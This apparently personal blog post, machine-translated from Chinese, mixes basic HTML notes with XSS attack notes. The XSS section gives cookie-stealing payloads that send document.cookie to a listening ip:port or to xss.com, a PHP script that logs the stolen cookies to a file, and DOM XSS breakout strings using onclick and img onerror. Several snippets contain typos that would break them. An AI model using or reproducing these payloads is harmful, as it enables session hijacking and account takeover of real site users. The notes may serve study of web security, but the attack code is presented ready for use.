---
title: web-attack
date: 2023-04-23 22:50:45
tags: ["code"]
lang: en
slug: web-attack
---

> Machine translated from Chinese by AI. For accuracy, please refer to the Chinese original.

# HTML Notes

## Head

```html
<!doctype html>
<html>
    <head>
        <title>*****************</title>
    </head>
    <body>
        <h1>*********一级标题</h1>
        <h2>*********二级标题</h2>
        <!-- 以此类推 -->
        <!-- 这个是注释格式 -->
        <!-- 也可以这样 





-->
        <!-- 三种弹窗 -->
        <script>alert()</script>
        <script>confirm()</script>
        <script>prompt()</script>
        <!--  -->
        
        
        <p>这个是段落</p>
        <a herf="地址">这个是链接</a>	<!-- 引用地址 -->
        <img src="地址",width="**",height="**" /> <!-- 引用图片 -->
		
        <tr>
            <td>row1,cell1</td>
            <td>row1,cell2</td>
        </tr>
        <tr>
            <td>row2,cell1</td>
            <td>row2,cell2</td>
        </tr>
        <!-- 以上是表格格式 -->
<!--内嵌网页语法-->
        <iframe src="URL"></iframe>
        <!--设置高度宽度-->
        <iframe src="url" width="200" height="200"></iframe>
        <!--删除边框-->
        <iframe src="url" frameborder="0"></iframe>
        <!--可以跳转-->
        <iframe src="url" name=frame_></iframe>
        <p><a href="url" target="iframe_a">urlname</a></p>
        
```









# XSS

## Types

- Reflected
- Stored
- DOM-based

## Reflected

Not persistent, only supports a single link

## Stored

Stored on the attacked server, persistent

## DOM

Not sent to the backend, the frontend retrieves information through the document object, and JS concatenates and executes it

### Cookie

```shell
#cookie组成
Name=Value	设置cookie名称和值，作为认证cookie,value值包括web服务器所提供的访问令牌

Expires	设置cookie的生存期。有两种cookie:会话型与持久型。Expires缺省是为会话型cookie,仅保留在客户端内存，用户关闭浏览器时失效
持久型保存在用户硬盘，生存期到期或用户注销结束会话才会失效

Path	cookie所属u经，只有该路径及其下级目录可获取到该cookie

Domain	指定了可以访问该Cookie的Web站点或域，只有这个域或子域才能获取该cookie

Secure	表示该Cookie只可以使用https协议传输

HTTPOnly	设置HTTPOnly表示cookie不能被js读取，放置客户端通过document.cookie属性访问cookie

SameSite	定义cookie如何跨域发送
```

#### Three attack methods

- Exfiltrate via request

  Start listening on a VPS, and after inserting code into a website with an XSS vulnerability, you can receive the target's cookie (base64_encode)

  ```html
  #攻击后浏览器打开新窗口，访问指定ip：端口，带上cookie
  <script>windows.open('http://ip:port/?q='+btoa(document.cookie));</script>
  #攻击在当前窗口访问ip和端口
  <script>location.herf='http://ip:port/?q='+btoa(document.cookie);</script>
  ```

- Visit a specified URL to execute JS

  ```javascript
  #构造js
  var img = document.createElement("img");
  img.src = "http://ip:port/?q="+btoa(document.cookie);
  document.body.appendChild(img);
  
  #构造payload
  <script src=http://ip:port/js_location></script>
  ```

- Use an XSS platform

  BLUE-LOTUS

  else......







---

```php+HTML
<?php
$filename ='cookies.txt';
$f = fopen($filename，'a'）
$cookie =urldecode($_GET['msg']) . PHP_EOL;
fwrite($f，$cookie);
fclose($f);
?>
```

 It will URL-decode the value of the msg parameter and then save it to the file cookies.txt.

   Next is to construct JS code to initiate an HTTP request. Using the Image object makes this task very easy. Create a new Image object, then set the src attribute. When the browser encounters the src attribute, it will automatically request the URL pointed to by src. For this URL, write the URL of the page we just wrote that receives the cookie, and pass the msg parameter with the value being the cookie. The final constructed statement is:

```php+HTML
<script>new Image().src="http://xss.com/recv_cookies.php?msg="+encodeURI(document.cookie);</script>
```



---

```php+HTML
function xssDom(){
var str = document.getElementById("msg").Value;
document.getElementById("show").innerHTML = "<a href="" + str + "'>xssDom</a>"
```

To make it free of syntax errors, we need to construct statements to close some tags. So, first we need a single quote to close the href attribute of the a tag. Then a ">" to close the a tag's "<”。这样构造以后，就变成了“<a href=''>construct the exploit code here'>xssDom</a>". So we can construct the following statement:

   ` '><script>alert('xss');</script>`



W3C stipulates that script code inside a script tag inserted via innerHTML cannot execute.

Directly inserting script cannot execute, but we can use events to trigger it, such as: onerror, onclick, etc.

Construct the following data:

`' onclick=alert(/xss/) //`

At this point the page code becomes:

`<a href='' onclick=alert(/xss/) //'>xssDom</a>`

There are other construction methods. For example, we close the a tag, then introduce another tag, such as an img tag. By using the img tag, when loading src, if an error occurs it will trigger the onerror function, so we can automatically execute script code without interaction. Try entering the following data:

`    '><img src=123 onerror=alert(/xss/) />`



## In-page jump

```xml
    页面内的跳转需要两步：

    方法一：

    ①：设置一个锚点链接<a href="#libai">我是李白</a>；（注意：href属性的属性值最前面要加#）

    ②：在页面中需要的位置设置锚点<a name="libai"></a>；（注意：a标签中要写一个name属性，属性值要与①中的href的属性值一样，不加#）标签中按需填写必要的文字，一般不写内容

    方法二：

    ①：同方法一的①

    ②：设置锚点的位置  <h3 id="libai">我是李白</h3>；在要跳转到的位置的标签中添加一个id属性，属性值与①中href的属性值一样，不加#

    方法二不用单独添加一个a标签来专门设置锚点 ，只在需要的位置的标签中添加一个id即可。
```